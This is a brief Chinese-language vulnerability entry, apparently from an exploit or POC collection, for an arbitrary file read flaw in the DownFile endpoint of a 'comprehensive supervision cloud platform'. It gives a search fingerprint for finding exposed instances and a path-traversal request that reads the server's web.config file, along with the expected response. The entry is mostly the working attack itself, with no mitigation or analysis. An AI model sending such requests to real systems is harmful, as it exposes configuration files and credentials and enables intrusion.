# 综合监管云平台DownFile任意文件读取漏洞

综合监管云平台DownFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/Download/DownFile?fileName=SetUp.exe"`
- **请求**：`GET /Download/DownFile?fileName=../web.config HTTP/1.1`
- **响应特征**：200